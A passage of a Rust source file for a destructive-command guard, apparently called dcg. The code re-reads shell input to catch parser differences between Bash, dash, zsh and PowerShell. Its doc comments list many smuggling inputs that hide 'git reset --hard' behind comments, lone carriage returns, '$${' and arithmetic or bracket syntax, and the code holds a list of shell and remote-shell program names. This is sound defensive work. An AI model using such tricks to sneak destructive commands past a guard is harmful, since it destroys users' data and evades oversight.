    // Wrappers and frontends.
    "sudo",
    "doas",
    "su",
    "sg",
    "runuser",
    "env",
    "command",
    "builtin",
    "exec",
    "eval",
    "time",
    "nohup",
    "nice",
    "ionice",
    "setsid",
    "timeout",
    "stdbuf",
    "chrt",
    "busybox",
    "xargs",
    "parallel",
    "watch",
    "entr",
    "flock",
    "hyperfine",
    "script",
    "nix-shell",
    "npx",
    "mise",
    "mise-exec",
    "find",
    // Shells and interpreters.
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "mksh",
    "yash",
    "ash",
    "fish",
    "csh",
    "tcsh",
    "pwsh",
    "powershell",
    "cmd",
    "nodejs",
    "bun",
    "deno",
    "tclsh",
    "wish",
    "expect",
    "julia",
    "osascript",
    "awk",
    "gawk",
    "mawk",
    "nawk",
    "sed",
    // Remote shells and copies.
    "ssh",
    "scp",
    "sftp",
    "mosh",
    "rsync",
];

/// Interpreters that are also run by a versioned name (`python3.12`).
const VERSIONED_INTERPRETER_NAMES: &[&str] = &[
    "python", "pypy", "node", "ruby", "perl", "php", "lua", "luajit",
];

/// Whether lower-case `name` names a program that an enabled pack keys on or
/// that dcg's own analysis recognizes.
fn is_recognized_program_name(name: &[u8], enabled_keywords: &[&str]) -> bool {
    let unversioned = {
        let digits = name
            .iter()
            .rev()
            .take_while(|byte| byte.is_ascii_digit() || **byte == b'.')
            .count();
        &name[..name.len() - digits]
    };
    STRUCTURAL_PROGRAM_NAMES
        .iter()
        .any(|known| known.as_bytes() == name)
        || VERSIONED_INTERPRETER_NAMES
            .iter()
            .any(|known| known.as_bytes() == unversioned)
        || enabled_keywords
            .iter()
            .any(|keyword| keyword.as_bytes().eq_ignore_ascii_case(name))
}

/// `command` with every carriage return that starts no CRLF pair spelled as
/// a line feed, or `None` when it has no such carriage return.
///
/// PowerShell ends a line at a lone CR exactly as at LF or CRLF: `echo
/// a<CR>git reset --hard` runs `git reset --hard`, and so do a `#` comment, a
/// `--%` argument list and a here-string closed by a lone CR, followed by a
/// command. Inside a quoted string or a here-string body a lone CR is data,
/// as an LF there is, and a backtick before it continues the line, as before
/// an LF. Measured on Windows PowerShell 5.1: NEL, U+2028, U+2029, VT and FF
/// end no line.
///
/// dcg's shared readers (the quote and span classifier, the sanitizer, the
/// segment splitter) end a line at LF only, as Bash, dash and zsh do: they
/// read a lone CR as a byte of the word around it. So in this spelling those
/// readers see the lines PowerShell runs. Callers read it only where the
/// command may be PowerShell.
///
/// Every lone CR is spelled, not only those PowerShell's tokenizer sees
/// between words: dcg's PowerShell tokenizer has no comments, so a quote in
/// `echo a # say "hi<CR>git reset --hard` would hide the line break from it.
/// The cost is a CR inside a string that PowerShell hands to a POSIX
/// program (`bash -c 'echo a<CR>git reset --hard'`), which reads it as a
/// byte: that is read as a line break too, and denied.
///
/// Length preserving (one ASCII byte for another), so every range in the
/// view is the same range in `command`.
#[must_use]
pub(crate) fn powershell_line_breaks_as_line_feeds(command: &str) -> Option<String> {
    let bytes = command.as_bytes();
    let is_lone_cr = |index: usize| bytes[index] == b'\r' && bytes.get(index + 1) != Some(&b'\n');
    let first = memchr::memchr_iter(b'\r', bytes).find(|&index| is_lone_cr(index))?;
    let mut spelled = bytes.to_vec();
    for (index, byte) in spelled.iter_mut().enumerate().skip(first) {
        if is_lone_cr(index) {
            *byte = b'\n';
        }
    }
    // Only an ASCII byte changed into another ASCII byte.
    String::from_utf8(spelled).ok()
}

/// `command` with each `#` that may start a comment inside a parenthesis, or
/// right after one, spelled `_`; `None` when it has no such `#`.
///
/// Whether such a `#` starts a comment depends on what the parenthesis is,
/// and shells disagree. Bash starts one after the `)` of a subshell
/// (`(true)#it's` LF `git reset --hard` runs `git reset --hard`), while zsh
/// reads a `#` in or after a glob or case-pattern group as data:
/// `ls (a|(b)#); git reset --hard`, `ls ( #); git reset --hard` and
/// `case x in a|(#)) ;; esac; git reset --hard` run it in zsh (measured
/// with `scripts/shell-truth`). dcg's readers decide by one table
/// ([`crate::context::PosixParens`]), which cannot see command position or
/// pattern context everywhere. A false comment hides the rest of its line,
/// so the evaluator also reads this spelling, in which each such `#` is
/// data, and deny wins: a wrong decision either way only over-blocks. A
/// missed comment already fails closed, as its quotes then open strings
/// that every reader sees alike.
///
/// Spelled: a `#` at a token start (see [`token_starts_at`]) while a `(` is
/// open, or right after a `)`. A `#` after a word byte (`2#1`, `$#`) starts
/// no comment to any reader and is left alone. The scan counts parentheses
/// without reading quotes, as a quote in a comment is what it must not
/// trust; a `)` never takes the count below zero. So a quoted `(` can only
/// add spellings, and a quoted `)` in the same group can end the count early
/// (`ls (a")" #)`), a known limit. Heredoc bodies that every shell reads as
/// bodies are raw text and passed over (see
/// [`crate::context::undisputed_heredoc_body_ranges`]). The cost: a real
/// comment there that names a destructive command (`(true)# git reset
/// --hard`, or one inside a subshell) is denied.
///
/// Length preserving (one ASCII byte for another), so every range in the
/// view is the same range in `command`.
#[must_use]
pub(crate) fn paren_hashes_as_data(command: &str) -> Option<String> {
    let bytes = command.as_bytes();
    let first_open = memchr::memchr2(b'(', b')', bytes)?;
    memchr::memchr(b'#', &bytes[first_open..])?;
    let bodies = crate::context::undisputed_heredoc_body_ranges(command);
    let mut bodies = bodies.iter().peekable();
    let mut spelled: Option<Vec<u8>> = None;
    let mut depth = 0usize;
    let mut i = first_open;
    while i < bytes.len() {
        if let Some(body) = bodies.peek() {
            if i >= body.end {
                bodies.next();
                continue;
            }
            if i >= body.start {
                i = body.end;
                continue;
            }
        }
        match bytes[i] {
            b'\\' => i += 1,
            b'(' => depth += 1,
            b')' => depth = depth.saturating_sub(1),
            b'#' if token_starts_at(bytes, i, 0)
                && (depth > 0 || byte_before(bytes, i, 0) == Some(b')')) =>
            {
                spelled.get_or_insert_with(|| bytes.to_vec())[i] = b'_';
            }
            _ => {}
        }
        i += 1;
    }
    // Only an ASCII byte changed into another ASCII byte.
    spelled.and_then(|spelled| String::from_utf8(spelled).ok())
}

/// The Bash reading [`bash_hashes_as_data`] or [`bash_parameter_openers`]
/// gives a command.
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum BashHashReading {
    /// The command with each byte that Bash reads one way, and dcg's readers
    /// another, spelled `_`: a `#` that is data to Bash but may start a
    /// comment to dcg's readers, or a `{` that opens nothing after `$$`.
    Spelled(String),
    /// The command has no reading here: the paren lookups read all the bytes
    /// they may before its end, a span this reading spells holds a comment
    /// in a command substitution, or a `${` is one dcg's readers cannot read
    /// as Bash does. The caller fails closed.
    Unread,
}

/// The Bash reading of `command` in which dcg's readers see each `#` that is
/// data to Bash as data; `None` when there is no such `#`.
///
/// Bash reads a `#` after a blank as data, not as a comment, in:
///
/// - an arithmetic command `((…))` (also a `for ((…))` header):
///   `(( x = 1 #)); git reset --hard` runs `git reset --hard` after the
///   arithmetic fails;
/// - a parenthesized group in the regex after `=~` in `[[ … ]]`, where
///   blanks are part of the word: `[[ x =~ ( #) ]]; git reset --hard` runs
///   it too;
/// - a pattern group: an operand of `==`, `=` or `!=` in `[[ … ]]` (Bash 4.1
///   and later read `@(…)`, `*(…)`, `?(…)`, `+(…)` and `!(…)` there, zsh
///   any `(…)`), and `@(…)`, `*(…)`, `?(…)` or `+(…)` anywhere once
///   `extglob` is on. With it off, such a group is a syntax error, and
///   nothing after it runs. A `!(…)` elsewhere is a group only with
///   `extglob` on; with it off, it is a negated subshell, in which `#` does
///   start a comment. So it is read as a group only when `extglob` is true:
///   the caller reads both.
///
/// dash reads the first as two subshells and has none of the others, so
/// there a `#` after a blank does start a comment: `(( 1 #'` LF
/// `git reset --hard))` LF `'))` runs `git reset --hard` in dash and nothing
/// in Bash. dcg's shared readers (the quote and span classifier, the
/// sanitizer, the segment splitter, the tokenizers) read the dash way, so the
/// evaluator also reads this spelling, in which they see the Bash reading,
/// and deny wins. Measured with bash 3.2, 5.2 and 5.3, zsh 5.9 and dash
/// 0.5.12.
///
/// Elsewhere Bash does read a comment (`[[ a == a #]]` is a syntax error;
/// `$((…))` reports an error that ends the line before anything after it
/// runs), and those are left alone: text spelled as data where Bash reads a
/// comment could hide a command, as a quote in the comment would then open.
///
/// Bash removes each `\`LF pair (a line continuation) outside single quotes
/// and comments before it reads tokens, so every test of what comes before
/// or after a byte reads past such pairs: `[\`LF`[`, `=\`LF`~` and
/// `for\`LF`((` open what they spell without the pair, and in `x\`LF`#` the
/// `#` is part of the word `x#`, so data, and spelled. A `#` starts a comment
/// at the start of a token (after a blank, `;`, `&`, `|`, `(`, `)`, `<`,
/// `>` or a backquote); a `[[`, `]]` or a `[[` operator is a token there too.
/// A `((` needs no token start, as `(` is a metacharacter (`for((`, `if((`,
/// `!((`, `case x in x)((`); any `((` not right after `$` counts. An
/// arithmetic command ends where Bash ends it (see
/// [`SpanReader::arithmetic`]); a `[[` operand word ends at a
/// blank, `;`, `&` or `)` outside its parentheses (`|` stays in it), and an
/// `extglob` group at its own `)`. Quoted text and comments outside them are
/// passed over, and so is a `${…}` outside the `$(…)` in it, which ends at
/// its first `}` (also a Bash 5.3 `${ …; }`, which the shared readers read
/// the same way). Inside them, only a `#` outside quotes that follows a
/// blank or an operator byte is spelled: one after a word byte (`2#101`,
/// `$#`, `${#x}`) starts no comment to any reader.
///
/// A heredoc body is raw text, and passed over: a quote in it (`don't`)
/// opens nothing. Only text that every shell reads as a body is (see
/// [`crate::context::undisputed_heredoc_body_ranges`]).
///
/// Every reader of those spans passes over quoted text with one reader,
/// [`SpanReader::quoted_end`], which reads `\`, `'…'`, `$'…'`, `"…"`,
/// backquotes, `$(…)`, `$((…))` and `${…}` as this function does. A command
/// substitution there holds command text, where Bash reads a comment whose
/// quotes open nothing and whose `)` closes nothing (`[[ x == $( : # "` LF
/// `) ]]`). That reader does not read comments, so such a span is
/// [`BashHashReading::Unread`]. Known limit, shared with dcg's other
/// readers: the `)` that ends a `case` pattern in such a substitution ends
/// the substitution there.
///
/// Each `((`, `$((` and `extglob` group costs a lookup of the `)` that
/// closes it, which a run of nested or unclosed `(` shares (see
/// [`SpanReader`]). A command whose lookups would read more than 16 times its
/// length (plus 4 KiB) is [`BashHashReading::Unread`].
///
/// Length preserving (one ASCII byte for another), so every range in the
/// view is the same range in `command`.
#[must_use]
pub(crate) fn bash_hashes_as_data(command: &str, extglob: bool) -> Option<BashHashReading> {
    bash_hashes_as_data_within(command, extglob, 16 * command.len() + 4096)
}

/// [`bash_hashes_as_data`] with lookups that may read `budget` bytes.
fn bash_hashes_as_data_within(
    command: &str,
    extglob: bool,
    budget: usize,
) -> Option<BashHashReading> {
    let bytes = command.as_bytes();
    if memchr::memchr(b'#', bytes).is_none()
        || (memchr::memchr(b'(', bytes).is_none()
            && memchr::memmem::find(bytes, b"=~").is_none()
            && memchr::memmem::find(bytes, b"\\\n").is_none())
    {
        return None;
    }
    match spell_bash_data_hashes(command, extglob, budget) {
        Ok(spelled) => spelled
            // Only an ASCII byte changed into another ASCII byte.
            .and_then(|spelled| String::from_utf8(spelled).ok())
            .map(BashHashReading::Spelled),
        Err(NoReading) => Some(BashHashReading::Unread),
    }
}

/// The Bash reading of the `${` openers in `command`, where dcg's shared
/// readers read them another way; `None` when they read every one as Bash
/// does.
///
/// - `$$` is one parameter, the shell's process ID, so a `{` right after it
///   is a plain character: `echo $${ ; git reset --hard` runs
///   `git reset --hard`. The shared readers see a `${` at the second `$`
///   that no `}` closes, and some of them then read the rest of the input
///   as part of it. Spelled: each such `{` as `_`, so no reader sees an
///   opener there. A run of `$` pairs from its left end, as the shell reads
///   it: after `$$$` the `{` does open an expansion. Bash 3.2 (also macOS
///   `/bin/sh`) still reads a `${` at the second `$` when it looks for the
///   `"` that ends a double-quoted word, so the quote dispute below is
///   checked there too (`echo "$${y:-'}" #'}"; git reset --hard` runs
///   `git reset --hard` in Bash 3.2), and a line continuation between the
///   pair and the `{` is Unread like one between `$` and `{`.
/// - Bash 5.3 reads `${` followed by a blank or `|` as a command
///   substitution (`${ cmd; }`, `${| cmd; }`), which ends at a `}` in
///   command position and holds command text with its own quotes and
///   comments: in `echo ${ : # "` LF `}; git reset --hard` LF `# "` the `"`
///   is comment text and `git reset --hard` runs. Earlier Bash, dash and zsh
///   report a bad substitution there. The shared readers read every `${` as
///   a parameter expansion, so they read the `"` as a quote and the body is
///   never read as commands. Unread: the caller fails closed.
/// - In double quotes, Bash reads a `'` inside a `${…}` as a quote when it
///   looks for the closing `}`; dash reads it as a plain character
///   ([`crate::context::braced_parameter_span`] reads it the dash way, other
///   readers the Bash way). When the two readings end the expansion at
///   different places, a `#` between the two ends can be a comment to dcg
///   and data to Bash: Bash runs `git reset --hard` in
///   `echo "${y:-'}" #'}"; git reset --hard`. Unread as well.
/// - A line continuation between the `$` and the `{` of a `${`
///   (`echo "$\` LF `{y:-'}" #'}"; git reset --hard`): the shell drops it
///   and reads `${`, but the end lookups above, and the readers that find a
///   nested `${`, read only a `$` right before a `{`. Unread too, so the
///   dispute above cannot hide behind a continuation.
///
/// The scan reads the raw bytes without quote context: a `\` escapes the
/// next byte, and a `\`LF pair (a line continuation) is passed over between
/// the bytes it tests. So an opener inside single quotes counts too, which
/// can only fail closed where the shell runs nothing; a wrong reading here
/// only adds a reading, as deny wins. Heredoc bodies with a quoted delimiter
/// are raw text to every shell and passed over (see
/// [`crate::context::undisputed_quoted_heredoc_body_ranges`]); an unquoted
/// body expands `${ …; }` too. Each `${` looks up
/// its end both ways; a lookup also notes the ends of the `${` nested in it,
/// so a run of nested ones is read once. A command whose lookups would read
/// more than 16 times its length (plus 4 KiB) is Unread.
///
/// Length preserving (one ASCII byte for another), so every range in the
/// view is the same range in `command`.
#[must_use]
pub(crate) fn bash_parameter_openers(command: &str) -> Option<BashHashReading> {
    let bytes = command.as_bytes();
    let len = bytes.len();
    memchr::memchr(b'$', bytes)?;
    memchr::memchr(b'{', bytes)?;
    let next = |at: usize| past_line_continuations(bytes, at);
    let mut budget = 16 * len + 4096;
    // The end of each `${` looked up so far, read the Bash way and the dash
    // way; a lookup notes the ends of the `${` nested in it too.
    let mut ends: [std::collections::HashMap<usize, Option<usize>>; 2] = Default::default();
    // Whether the `${` at `opener` ends at another place read the Bash way
    // than read the dash way, or the lookups would read past the budget.
    let mut disputed = |opener: usize| -> bool {
        let mut end = |dash: bool| -> Option<Option<usize>> {
            let ends = &mut ends[usize::from(dash)];
            if let Some(end) = ends.get(&opener) {
                return Some(*end);
            }
            let end = crate::context::braced_parameter_span_with_nested(
                bytes,
                opener,
                dash,
                |nested, end| {
                    ends.insert(nested, end);
                },
            );
            budget = budget.checked_sub(end.unwrap_or(len) - opener)?;
            Some(end)
        };
        !matches!((end(false), end(true)), (Some(bash), Some(dash)) if bash == dash)
    };
    let mut spelled: Option<Vec<u8>> = None;
    let mut bodies = crate::context::undisputed_quoted_heredoc_body_ranges(command).into_iter();
    let mut body = bodies.next();
    let mut i = 0;
    while i < len {
        while body.as_ref().is_some_and(|body| body.end <= i) {
            body = bodies.next();
        }
        if let Some(raw) = body.as_ref().filter(|body| body.start <= i) {
            i = raw.end;
            continue;
        }
        match bytes[i] {
            b'\\' => i += 2,
            b'$' => {
                let after = next(i + 1);
                match bytes.get(after) {
                    // `$$`: a `{` right after it is a plain character.
                    Some(b'$') => {
                        let brace = next(after + 1);
                        if bytes.get(brace) == Some(&b'{') {
                            // Bash 3.2 reads a `${` at the second `$` when
                            // it looks for the end of a double-quoted word,
                            // so the Bash and dash ends must agree there too
                            // (see below), and a line continuation before
                            // the `{` hides that dispute as it does after
                            // a lone `$`.
                            if brace != after + 1 || disputed(after) {
                                return Some(BashHashReading::Unread);
                            }
                            spelled.get_or_insert_with(|| bytes.to_vec())[brace] = b'_';
                        }
                        i = after + 1;
                    }
                    Some(b'{') => {
                        if matches!(
                            bytes.get(next(after + 1)),
                            Some(b' ' | b'\t' | b'\n' | b'|')
                        ) {
                            return Some(BashHashReading::Unread);
                        }
                        // A line continuation between `$` and `{`: the shell
                        // drops it and reads `${`, but the end lookups (and
                        // the nested-`${` reads of every other reader) need
                        // the two bytes side by side. Unread.
                        if after != i + 1 || disputed(i) {
                            return Some(BashHashReading::Unread);
                        }
                        i = after + 1;
                    }
                    _ => i = after,
                }
            }
            _ => i += 1,
        }
    }
    // Only an ASCII byte changed into another ASCII byte.
    spelled
        .and_then(|spelled| String::from_utf8(spelled).ok())
        .map(BashHashReading::Spelled)
}

/// The Bash reading of the bracketed words in `command` that dcg's shared
/// readers split at a blank; `None` when there is none.
///
/// - `$[…]` is Bash's old arithmetic expansion, one piece of its word
///   through the matching `]`, blanks included: `x=$[1 + 2] git reset --hard`
///   runs `git reset --hard` in Bash.
/// - A subscript in an assignment word: Bash reads `x[1 + 1]=a` as one
///   assignment word, so `x[1 + 1]=a git reset --hard` runs it too.
///
/// dash and the shared readers read `x=$[1`, `+` and `2]` (or `x[1`, `+`
/// and `1]=a`) as three words, so the command name is `+`. Spelled: each
/// blank (space or tab) in such brackets, outside quotes and substitutions,
/// as `_`, which no reader splits at. The caller reads the spelling too and
/// deny wins, so where dash does split, the command as written still
/// answers. Brackets that do not close on their line, and a subscript that
/// no `=` or `+=` follows, are left alone. Heredoc bodies with a quoted
/// delimiter are raw text and passed over. A command whose bracket lookups
/// would read more than 16 times its length (plus 4 KiB) is
/// [`BashHashReading::Unread`].
///
/// Length preserving (one ASCII byte for another), so every range in the
/// view is the same range in `command`.
#[must_use]
pub(crate) fn bash_bracket_words(command: &str) -> Option<BashHashReading> {
    let bytes = command.as_bytes();
    let len = bytes.len();
    memchr::memchr(b'[', bytes)?;
    let mut budget = 16 * len + 4096;
    let mut spelled: Option<Vec<u8>> = None;
    let mut bodies = crate::context::undisputed_quoted_heredoc_body_ranges(command).into_iter();
    let mut body = bodies.next();
    let mut in_double = false;
    let mut i = 0;
    while i < len {
        while body.as_ref().is_some_and(|body| body.end <= i) {
            body = bodies.next();
        }
        if let Some(raw) = body.as_ref().filter(|body| body.start <= i) {
            i = raw.end;
            continue;
        }
        let opener = match bytes[i] {
            b'\\' => {
                i += 2;
                continue;
            }
            b'\'' if !in_double => {
                i = memchr::memchr(b'\'', &bytes[i + 1..]).map_or(len, |at| i + 1 + at + 1);
                continue;
            }
            b'"' => {
                in_double = !in_double;
                i += 1;
                continue;
            }
            b'`' => {
                i = posix_backquote_end(bytes, i + 1);
                continue;
            }
            b'$' if bytes.get(i + 1) == Some(&b'(') => {
                i = consume_shell_paren_construct(bytes, i + 2, len);
                continue;
            }
            b'$' if bytes.get(i + 1) == Some(&b'{') => {
                i = crate::context::consume_braced_parameter(bytes, i)
                    .0
                    .max(i + 2);
                continue;
            }
            b'$' if !in_double && bytes.get(i + 1) == Some(&b'[') => i + 1,
            b'[' if !in_double && assignment_name_ends_at(bytes, i) => i,
            _ => {
                i += 1;
                continue;
            }
        };
        let Some((close, blanks)) = bracket_word_close(bytes, opener + 1, &mut budget) else {
            if budget == 0 {
                return Some(BashHashReading::Unread);
            }
            i = opener + 1;
            continue;
        };
        let assigns = bytes[opener - 1] == b'$' || {
            let after = &bytes[close + 1..];
            after.starts_with(b"=") || after.starts_with(b"+=")
        };
        if assigns && !blanks.is_empty() {
            let view = spelled.get_or_insert_with(|| bytes.to_vec());
            for blank in blanks {
                view[blank] = b'_';
            }
        }
        i = close + 1;
    }
    // Only an ASCII byte changed into another ASCII byte.
    spelled
        .and_then(|spelled| String::from_utf8(spelled).ok())
        .map(BashHashReading::Spelled)
}

/// Whether the `[` at `at` follows a shell name that starts a word: the
/// subscript of an assignment word (`x[1]=a`), when `=` follows its `]`.
fn assignment_name_ends_at(bytes: &[u8], at: usize) -> bool {
    let start = bytes[..at]
        .iter()
        .rposition(|byte| !(byte.is_ascii_alphanumeric() || *byte == b'_'))
        .map_or(0, |before| before + 1);
    start < at
        && (bytes[start].is_ascii_alphabetic() || bytes[start] == b'_')
        && (start == 0
            || matches!(
                bytes[start - 1],
                b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'(' | b')'
            ))
}

/// The `]` that closes a bracket opened before `from`, and the blanks the
/// bracket holds outside quotes and substitutions; `None` when it does not
/// close on its line, or when the lookup would read past `budget` (then
/// `budget` is 0).
fn bracket_word_close(
    bytes: &[u8],
    from: usize,
    budget: &mut usize,
) -> Option<(usize, Vec<usize>)> {
    let len = bytes.len();
    let mut depth = 1usize;
    let mut blanks = Vec::new();
    let mut i = from;
    while i < len {
        let start = i;
        match bytes[i] {
            b'\n' => return None,
            b'\\' => i += 2,
            b' ' | b'\t' => {
                blanks.push(i);
                i += 1;
            }
            b'\'' => {
                i = memchr::memchr(b'\'', &bytes[i + 1..]).map_or(len, |at| i + 1 + at + 1);
            }
            b'"' => {
                i += 1;
                while i < len && bytes[i] != b'"' {
                    i += if bytes[i] == b'\\' { 2 } else { 1 };
                }
                i += 1;
            }
            b'`' => i = posix_backquote_end(bytes, i + 1),
            b'$' if bytes.get(i + 1) == Some(&b'(') => {
                i = consume_shell_paren_construct(bytes, i + 2, len);
            }
            b'$' if bytes.get(i + 1) == Some(&b'{') => {
                i = crate::context::consume_braced_parameter(bytes, i)
                    .0
                    .max(i + 2);
            }
            b'[' => {
                depth += 1;
                i += 1;
            }
            b']' => {
                depth -= 1;
                if depth == 0 {
                    return Some((i, blanks));
                }
                i += 1;
            }
            _ => i += 1,
        }
        let Some(left) = budget.checked_sub(i.min(len) - start) else {
            *budget = 0;
            return None;
        };
        *budget = left;
    }
    None
}

/// The byte after the backquote that closes one opened before `from`.
fn posix_backquote_end(bytes: &[u8], from: usize) -> usize {
    let mut i = from;
    while i < bytes.len() {
        match bytes[i] {
            b'\\' => i += 2,
            b'`' => return i + 1,
            _ => i += 1,
        }
    }
    bytes.len()
}

fn spell_bash_data_hashes(
    command: &str,
    extglob: bool,
    budget: usize,
) -> Result<Option<Vec<u8>>, NoReading> {
    let bytes = command.as_bytes();
    let len = bytes.len();
    let next = |at: usize| past_line_continuations(bytes, at);
    let mut spans = SpanReader::new(bytes, budget);
    let mut spelled: Option<Vec<u8>> = None;
    let mut frames: Vec<Frame> = Vec::new();
    // Inside `[[ … ]]`, where operators take a pattern or regex word.
    let mut in_conditional = false;
    // Where the last comment ended: the `\`LF pair that ends a comment is no
    // line continuation.
    let mut floor = 0usize;
    // Heredoc bodies are raw text: a quote in one opens nothing.
    let mut bodies = crate::context::undisputed_heredoc_body_ranges(command)
        .into_iter()
        .peekable();
    let mut i = 0;
    while i < len {
        if let Some(body) = bodies.peek() {
            if i >= body.end {
                bodies.next();
                continue;
            }
            if i >= body.start {
                i = body.end;
                continue;
            }
        }
        let top = frames.last().copied();
        let in_double = top == Some(Frame::Double);
        let in_braces = matches!(top, Some(Frame::Braces { .. }));
        let byte = bytes[i];
        i = match byte {
            b'\\' => i + 2,
            b'"' if in_double => {
                frames.pop();
                i + 1
            }
            b'"' => {
                frames.push(Frame::Double);
                i + 1
            }
            // `$$` is one parameter: a `{` or `(` after it opens nothing.
            b'$' if bytes.get(next(i + 1)) == Some(&b'$') => next(i + 1) + 1,
            b'$' if bytes.get(next(i + 1)) == Some(&b'{') => {
                let quoted = in_double || top == Some(Frame::Braces { quoted: true });
                frames.push(Frame::Braces { quoted });
                next(i + 1) + 1
            }
            b'$' if bytes.get(next(i + 1)) == Some(&b'(') => {
                let open = next(i + 1);
                let second = next(open + 1);
                let lookup = if bytes.get(second) == Some(&b'(') {
                    spans.arithmetic(second)?
                } else {
                    None
                };
                if let Some(end) = lookup {
                    end
                } else {
                    frames.push(Frame::Substitution(0));
                    open + 1
                }
            }
            _ if in_double => i + 1,
            // Bash ends a `${` at the first `}` outside quotes; only a nested
            // `${` nests (`${x:-{}` ends at its `}`).
            b'}' if in_braces => {
                frames.pop();
                i + 1
            }
            b'\'' if top == Some(Frame::Braces { quoted: true }) => i + 1,
            b'$' if crate::context::ansi_c_quote_starts_at(bytes, i) => {
                crate::context::skip_ansi_c_quoted(bytes, i + 2)
            }
            b'\'' => memchr::memchr(b'\'', &bytes[i + 1..]).map_or(len, |at| i + at + 2),
            b'<' | b'>' if bytes.get(next(i + 1)) == Some(&b'(') => {
                frames.push(Frame::Substitution(0));
                next(i + 1) + 1
            }
            _ if in_braces => i + 1,
            b'#' if token_starts_at(bytes, i, floor) => {
                let end = memchr::memchr(b'\n', &bytes[i..]).map_or(len, |at| i + at);
                floor = end + 1;
                end
            }
            b'#' => {
                // Joined to the word before it by a line continuation (any
                // other `#` here follows a word byte).
                if hash_may_start_comment(bytes, i) {
                    spelled.get_or_insert_with(|| bytes.to_vec())[i] = b'_';
                }
                i + 1
            }
            b'(' if byte_before(bytes, i, floor) != Some(b'$')
                && let Some(second) = second_open_paren(bytes, i) =>
            {
                if let Some(end) = spans.arithmetic(second)? {
                    spans.spell_hashes(second + 1, end - 2, false, &mut spelled)?;
                    end
                } else {
                    if let Some(Frame::Substitution(open)) = frames.last_mut() {
                        *open += 1;
                    }
                    i + 1
                }
            }
            b'@' | b'*' | b'?' | b'+' | b'!'
                if (byte != b'!' || extglob) && bytes.get(next(i + 1)) == Some(&b'(') =>
            {
                let open = next(i + 1);
                if let Some(end) = spans.close(open)? {
                    spans.spell_hashes(open, end, true, &mut spelled)?;
                    end
                } else {
                    // Unclosed, a syntax error: nothing after it runs.
                    i + 1
                }
            }
            b'[' if bytes.get(next(i + 1)) == Some(&b'[')
                && token_starts_at(bytes, i, floor)
                && matches!(
                    bytes.get(next(next(i + 1) + 1)),
                    None | Some(b' ' | b'\t' | b'\n' | b'(')
                ) =>
            {
                in_conditional = true;
                next(i + 1) + 1
            }
            b']' if in_conditional
                && bytes.get(next(i + 1)) == Some(&b']')
                && token_starts_at(bytes, i, floor) =>
            {
                in_conditional = false;
                next(i + 1) + 1
            }
            b'=' | b'!'
                if in_conditional
                    && token_starts_at(bytes, i, floor)
                    && let Some((regex, after)) = conditional_operator(bytes, i) =>
            {
                let mut start = after;
                loop {
                    let skipped = next(start);
                    start = skipped
                        + bytes[skipped..]
                            .iter()
                            .take_while(|b| matches!(b, b' ' | b'\t' | b'\n'))
                            .count();
                    if start == skipped {
                        break;
                    }
                }
                let end = spans.operand_word_end(start)?;
                // A regex spells every `#` in it, a pattern only those in
                // its groups.
                spans.spell_hashes(start, end, !regex, &mut spelled)?;
                end
            }
            b'(' => {
                if let Some(Frame::Substitution(open)) = frames.last_mut() {
                    *open += 1;
                }
                i + 1
            }
            b')' => {
                match frames.last_mut() {
                    Some(Frame::Substitution(0)) => {
                        frames.pop();
                    }
                    Some(Frame::Substitution(open)) => *open -= 1,
                    _ => {}
                }
                i + 1
            }
            _ => i + 1,
        };
    }
    Ok(spelled)
}

/// A span of [`bash_hashes_as_data`] has no reading: the lookups have read
/// all the bytes they may, or the span holds a comment in a command
/// substitution (see [`SpanReader::quoted_end`]).
struct NoReading;

/// The span readers of [`bash_hashes_as_data`]: where the parentheses of an
/// arithmetic command or a pattern group close, where a `[[` operand word
/// ends, and which `#` in such a span to spell. All of them pass over quoted
/// text with one reader, [`Self::quoted_end`].
///
/// A scan from a `(` to its `)` also matches every `(` it passes outside
/// quotes, and a scan from one of those reads the same bytes the same way,
/// so the matches are kept and such a lookup reads nothing again. A run of
/// nested or unclosed `(` costs one scan, not one per `(`. The end of every
/// quoted text read is kept too (its reading does not depend on where it
/// is), so a later scan passes it at once. Lookups the kept matches do not
/// answer scan afresh; all the scans may read `budget` bytes.
struct SpanReader<'a> {
    bytes: &'a [u8],
    budget: usize,
    spent: usize,
    /// Each `(` the last scan passed, with the index past its `)`, or `None`
    /// when no `)` closes it.
    closes: std::collections::HashMap<usize, Option<usize>>,
    /// The index past each quoted text read (other than a `${…}`, whose
    /// reading depends on quotes around it), by where it starts.
    quoted: std::collections::HashMap<usize, usize>,
}

/// Quoted text [`SpanReader::quoted_end`] is inside of.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Quoted {
    /// A double-quoted string.
    Double,
    /// A backquoted command.
    Backquote,
    /// A `$(…)` or `$((…))` body, with the parentheses open in it (the
    /// second `(` of a `$((` is one).
    Parens(usize),
    /// A `${…}`, and whether it is in double quotes, where a `'` in it is a
    /// literal.
    Braces { quoted: bool },
}

impl<'a> SpanReader<'a> {
    fn new(bytes: &'a [u8], budget: usize) -> Self {
        Self {
            bytes,
            budget,
            spent: 0,
            closes: std::collections::HashMap::new(),
            quoted: std::collections::HashMap::new(),
        }
    }

    /// Index past the quoted text that starts at `at`, or `end` when it does
    /// not close before `end`; `None` when no quoted text starts there.
    ///
    /// Quoted text is read as [`bash_hashes_as_data`] reads it: `\` escapes
    /// the byte after it; `'…'`; `$'…'`, in which `\` escapes; `"…"`, in which
    /// `$(…)`, `${…}` and backquotes nest; a backquoted command, which ends at
    /// the first unescaped backquote (a quote in it opens nothing, in Bash and
    /// zsh); `$(…)` and `$((…))`, whose bodies count both parentheses of a
    /// `$((`; `${…}`,
    /// which ends at its first `}` outside quotes and in double quotes reads
    /// `'` as a literal; and `$$`, after which a `(` or `{` opens nothing.
    /// [`NoReading`] when a command substitution in it holds a `#` that may
    /// start a comment: Bash reads that comment to the end of its line, so
    /// its quotes open nothing and its `)` closes nothing.
    fn quoted_end(&mut self, at: usize, end: usize) -> Result<Option<usize>, NoReading> {
        let bytes = self.bytes;
        let mut frames: Vec<(Quoted, usize)> = Vec::new();
        let mut i = at;
        while i < end {
            self.spent += 1;
            let top = frames.last().map(|frame| frame.0);
            match quote_opens(bytes, i, top) {
                Some(QuoteOpen::Skip(past)) => i = past,
                Some(QuoteOpen::Push(quoted, body)) => {
                    if let Some(&past) = self.quoted.get(&i) {
                        i = past;
                    } else {
                        frames.push((quoted, i));
                        i = body;
                    }
                }
                None => {
                    let closed = match (frames.last_mut(), bytes[i]) {
                        (None, _) => return Ok(None),
